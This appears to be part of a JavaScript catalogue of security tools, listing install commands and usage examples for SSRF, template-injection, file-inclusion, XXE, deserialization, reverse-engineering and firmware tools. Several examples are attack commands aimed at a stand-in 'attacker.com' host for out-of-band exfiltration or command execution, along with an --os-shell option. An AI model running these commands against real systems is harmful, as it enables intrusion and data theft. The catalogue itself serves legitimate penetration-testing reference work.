  bucketstream: {
    name: "bucketstream",
    category: ["cloud_security", "aws"],
    description: "Find interesting Amazon S3 Buckets",
    github: "https://github.com/eth0izzle/bucket-stream",
    stars: "2k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/eth0izzle/bucket-stream && pip3 install -r requirements.txt",
      macos: "git clone https://github.com/eth0izzle/bucket-stream && pip3 install -r requirements.txt",
      windows: "git clone https://github.com/eth0izzle/bucket-stream && pip install -r requirements.txt"
    },
    basic_usage: ["python3 bucket-stream.py"],
    advanced_usage: ["python3 bucket-stream.py --threads 10"],
    examples: [{command: "python3 bucket-stream.py --keywords company,backup", description: "Find buckets with keywords"}],
    use_cases: ["S3 bucket discovery", "Certificate transparency monitoring", "Data leak detection"],
    documentation: "https://github.com/eth0izzle/bucket-stream",
    notes: ["Real-time monitoring", "Uses certstream"]
  },

  // SSRF Tools
  ssrfmap: {
    name: "SSRFmap",
    category: ["web_security", "ssrf"],
    description: "Automatic SSRF fuzzer and exploitation tool",
    github: "https://github.com/swisskyrepo/SSRFmap",
    stars: "3k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/swisskyrepo/SSRFmap && pip3 install -r requirements.txt",
      macos: "git clone https://github.com/swisskyrepo/SSRFmap && pip3 install -r requirements.txt",
      windows: "git clone https://github.com/swisskyrepo/SSRFmap && pip install -r requirements.txt"
    },
    basic_usage: ["python3 ssrfmap.py -r request.txt"],
    advanced_usage: ["python3 ssrfmap.py -r request.txt -p url -m readfiles"],
    examples: [{command: "python3 ssrfmap.py -r request.txt -p url", description: "Test for SSRF"}],
    use_cases: ["SSRF detection", "Cloud metadata exploitation", "Internal network access"],
    documentation: "https://github.com/swisskyrepo/SSRFmap",
    notes: ["Multiple modules", "Cloud-specific payloads"]
  },

  // Template Injection
  tplmap: {
    name: "tplmap",
    category: ["web_security", "template_injection"],
    description: "Server-Side Template Injection testing tool",
    github: "https://github.com/epinna/tplmap",
    stars: "3k+",
    license: "GPL-3.0",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/epinna/tplmap && pip install -r requirements.txt",
      macos: "git clone https://github.com/epinna/tplmap && pip install -r requirements.txt",
      windows: "git clone https://github.com/epinna/tplmap && pip install -r requirements.txt"
    },
    basic_usage: ["python tplmap.py -u 'http://example.com?name=test'"],
    advanced_usage: ["python tplmap.py -u 'URL' --os-shell"],
    examples: [{command: "python tplmap.py -u 'http://example.com?name=*' --engine all", description: "Test for SSTI"}],
    use_cases: ["Template injection testing", "RCE exploitation", "Web application testing"],
    documentation: "https://github.com/epinna/tplmap",
    notes: ["Multiple template engines", "Exploitation capabilities"]
  },

  // LFI/RFI Tools
  fimap: {
    name: "fimap",
    category: ["web_security", "file_inclusion"],
    description: "Find, prepare, audit, exploit LFI/RFI vulnerabilities",
    github: "https://github.com/kurobeats/fimap",
    stars: "1k+",
    license: "GPL-2.0",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/kurobeats/fimap",
      macos: "git clone https://github.com/kurobeats/fimap",
      windows: "git clone https://github.com/kurobeats/fimap"
    },
    basic_usage: ["python fimap.py -u 'http://example.com/page.php?file='"],
    advanced_usage: ["python fimap.py -u 'URL' -w /tmp/output.txt"],
    examples: [{command: "python fimap.py -u 'http://example.com/page.php?file=test'", description: "Test for LFI/RFI"}],
    use_cases: ["File inclusion testing", "LFI exploitation", "Web vulnerability assessment"],
    documentation: "https://github.com/kurobeats/fimap",
    notes: ["Automated exploitation", "Log file inclusion"]
  },

  // XXE Tools  
  xxeinjector: {
    name: "XXEinjector",
    category: ["web_security", "xxe"],
    description: "Tool for automatic exploitation of XXE vulnerability",
    github: "https://github.com/enjoiz/XXEinjector",
    stars: "1k+",
    license: "GPL-3.0",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/enjoiz/XXEinjector",
      macos: "git clone https://github.com/enjoiz/XXEinjector",
      windows: "git clone https://github.com/enjoiz/XXEinjector"
    },
    basic_usage: ["ruby XXEinjector.rb --host=192.168.1.2 --path=/test --file=/tmp/req.txt"],
    advanced_usage: ["ruby XXEinjector.rb --host=IP --path=/test --file=req.txt --rhost=attacker.com --rport=443"],
    examples: [{command: "ruby XXEinjector.rb --host=192.168.1.2 --path=/api --file=request.txt", description: "Test for XXE"}],
    use_cases: ["XXE vulnerability testing", "Data exfiltration", "SSRF via XXE"],
    documentation: "https://github.com/enjoiz/XXEinjector",
    notes: ["Out-of-band XXE", "File extraction"]
  },

  // Deserialization
  ysoserial: {
    name: "ysoserial",
    category: ["web_security", "deserialization"],
    description: "Java deserialization payload generator",
    github: "https://github.com/frohoff/ysoserial",
    stars: "8k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "Download jar from releases",
      macos: "Download jar from releases",
      windows: "Download jar from releases"
    },
    basic_usage: ["java -jar ysoserial.jar CommonsCollections1 'command'"],
    advanced_usage: ["java -jar ysoserial.jar CommonsCollections6 'calc.exe' | base64"],
    examples: [{command: "java -jar ysoserial.jar CommonsCollections1 'ping attacker.com'", description: "Generate payload"}],
    use_cases: ["Java deserialization exploitation", "Payload generation", "RCE testing"],
    documentation: "https://github.com/frohoff/ysoserial",
    notes: ["Multiple gadget chains", "Java focused"]
  },

  // Reporting Tools
  dradis: {
    name: "Dradis",
    category: ["reporting", "collaboration"],
    description: "Collaboration and reporting for security teams",
    github: "https://github.com/dradis/dradis-ce",
    stars: "1k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "git clone https://github.com/dradis/dradis-ce && cd dradis-ce && ./bin/setup",
      macos: "git clone https://github.com/dradis/dradis-ce && cd dradis-ce && ./bin/setup",
      windows: "Docker recommended"
    },
    basic_usage: ["bundle exec rails server"],
    advanced_usage: ["bundle exec rails server -b 0.0.0.0"],
    examples: [{command: "bundle exec rails server", description: "Start Dradis server"}],
    use_cases: ["Security report generation", "Team collaboration", "Finding management"],
    documentation: "https://dradis.com/support/",
    notes: ["Web-based", "Tool integrations"]
  },

  // Binary Analysis
  ghidra: {
    name: "Ghidra",
    category: ["reverse_engineering", "malware_analysis"],
    description: "NSA's software reverse engineering framework",
    github: "https://github.com/NationalSecurityAgency/ghidra",
    stars: "48k+",
    license: "Apache-2.0",
    government_approved: true,
    installation: {
      linux: "Download from ghidra-sre.org and extract",
      macos: "Download from ghidra-sre.org and extract",
      windows: "Download from ghidra-sre.org and extract"
    },
    basic_usage: ["./ghidraRun"],
    advanced_usage: ["./analyzeHeadless /path/to/project ProjectName -import binary"],
    examples: [{command: "./ghidraRun", description: "Launch Ghidra GUI"}],
    use_cases: ["Reverse engineering", "Malware analysis", "Binary auditing"],
    documentation: "https://ghidra-sre.org/",
    notes: ["NSA developed", "Multi-architecture support"]
  },

  radare2: {
    name: "radare2",
    category: ["reverse_engineering", "binary_analysis"],
    description: "Unix-like reverse engineering framework",
    github: "https://github.com/radareorg/radare2",
    stars: "19k+",
    license: "LGPL-3.0",
    government_approved: true,
    installation: {
      linux: "git clone https://github.com/radareorg/radare2 && cd radare2 && sys/install.sh",
      macos: "brew install radare2",
      windows: "Download installer"
    },
    basic_usage: ["r2 binary", "r2 -A binary"],
    advanced_usage: ["r2 -AA -w binary"],
    examples: [{command: "r2 -A /bin/ls", description: "Analyze binary"}],
    use_cases: ["Binary analysis", "Debugging", "Exploit development"],
    documentation: "https://book.rada.re/",
    notes: ["Command-line focused", "Scriptable"]
  },

  // IoT Security
  firmwalker: {
    name: "Firmwalker",
    category: ["iot_security", "firmware_analysis"],
    description: "Script for searching firmware for interesting files",
    github: "https://github.com/craigz28/firmwalker",
    stars: "1k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/craigz28/firmwalker",
      macos: "git clone https://github.com/craigz28/firmwalker",
      windows: "git clone https://github.com/craigz28/firmwalker"
    },
    basic_usage: ["./firmwalker.sh /path/to/extracted/firmware /tmp/output.txt"],
    advanced_usage: ["./firmwalker.sh firmware_dir output.txt"],
    examples: [{command: "./firmwalker.sh /tmp/firmware results.txt", description: "Analyze extracted firmware"}],
    use_cases: ["Firmware analysis", "IoT security testing", "Configuration file discovery"],
    documentation: "https://github.com/craigz28/firmwalker",
    notes: ["Bash script", "Pattern matching"]
  },

  binwalk: {
    name: "Binwalk",
    category: ["iot_security", "firmware_analysis"],
    description: "Firmware analysis tool for extracting embedded filesystems",
    github: "https://github.com/ReFirmLabs/binwalk",
    stars: "10k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "sudo apt install binwalk",
      macos: "brew install binwalk",
      windows: "pip install binwalk"
    },
    basic_usage: ["binwalk firmware.bin", "binwalk -e firmware.bin"],
    advanced_usage: ["binwalk -Me firmware.bin"],
    examples: [{command: "binwalk -Me router_firmware.bin", description: "Extract firmware contents"}],
    use_cases: ["Firmware extraction", "IoT analysis", "Embedded system testing"],
    documentation: "https://github.com/ReFirmLabs/binwalk/wiki",
    notes: ["Automatic extraction", "Signature database"]
  }
};

// Tool categories mapping
export const TOOL_CATEGORIES = {
  network_scanning: ["nmap", "masscan", "netdiscover"],
  web_security: ["owasp-zap", "nuclei", "sqlmap", "ffuf", "dirsearch", "feroxbuster", "gobuster", "wpscan", "joomscan"],
  vulnerability_assessment: ["openvas", "trivy", "nuclei"],
  pentesting: ["metasploit", "sqlmap", "hydra", "sn1per"],
  osint: ["sherlock", "socialscan", "maigret", "theharvester", "holehe", "phoneinfoga", "blackbird", "whatsmyname", "namechk"],
  username_search: ["sherlock", "socialscan", "maigret", "blackbird", "whatsmyname", "namechk"],
  social_media: ["twint", "instagramosint"],
  subdomain_enumeration: ["subfinder", "assetfinder", "amass"],
  dns: ["dnsrecon", "dnsx"],
  email: ["holehe", "theharvester", "emailrepIO"],
  phone: ["phoneinfoga"],
  ip: ["ipinfo"],
  github: ["gitrob", "truffleHog", "gitLeaks", "githound"],
  credentials: ["gitrob", "truffleHog", "gitLeaks", "githound"],
  reconnaissance: ["reconftw", "sn1per", "gospider", "hakrawler", "waymore", "paramspider", "httpx", "aquatone", "wappalyzer", "waybackurls", "gau", "unfurl"],
  password_testing: ["hydra", "medusa", "john", "hashcat", "aircrack-ng"],
  hash_cracking: ["john", "hashcat"],
  bruteforce: ["hydra", "medusa"],
  forensics: ["autopsy", "volatility", "exiftool"],
  memory_analysis: ["volatility"],
  metadata: ["exiftool"],
  geolocation: ["exiftool", "geoCreepy"],
  network_monitoring: ["snort", "wireshark", "bettercap"],
  network_security: ["bettercap", "mitmproxy"],
  mitm: ["bettercap"],
  ids: ["snort"],
  wireless: ["aircrack-ng", "wifite"],
  wireless_security: ["wifite"],
  container_security: ["trivy", "dockle"],
  docker: ["dockle"],
  cloud_security: ["cloudmapper", "prowler", "scoutsuite", "cloudfox", "s3scanner", "bucketstream"],
  aws: ["cloudmapper", "prowler", "cloudfox", "s3scanner", "bucketstream"],
  multi_cloud: ["scoutsuite"],
  compliance: ["prowler"],
  crypto: ["btcrecover"],
  password_recovery: ["btcrecover"],
  api_security: ["mitmproxy", "arjun"],
  mobile_security: ["mobsf"],
  static_analysis: ["mobsf", "semgrep", "bandit"],
  code_analysis: ["semgrep", "bandit"],
  sast: ["semgrep"],
  python: ["bandit"],
  exploitation: ["metasploit"],
  exploit_development: ["pwntools", "ropper"],
  rop: ["ropper"],
  ctf: ["pwntools"],
  reverse_engineering: ["ghidra", "radare2"],
  binary_analysis: ["radare2"],
  malware_analysis: ["volatility", "ghidra"],
  iot_security: ["firmwalker", "binwalk"],
  firmware_analysis: ["firmwalker", "binwalk"],
  xss: ["xsser", "dalfox"],
  sql_injection: ["sqlmap"],
  ssl_tls: ["testssl", "sslscan"],
  directory_bruteforce: ["dirsearch", "feroxbuster", "gobuster"],
  fuzzing: ["ffuf"],
  cms: ["wpscan", "joomscan"],
  jwt: ["jwtcrack"],
  graphql: ["graphqlmap"],
  ssrf: ["ssrfmap"],
  template_injection: ["tplmap"],
  file_inclusion: ["fimap"],
  xxe: ["xxeinjector"],
  deserialization: ["ysoserial"],
  reporting: ["dradis"],
  collaboration: ["dradis"],
  system_security: ["lynis"],
  auditing: ["lynis"],
  automation: ["reconftw"]
};
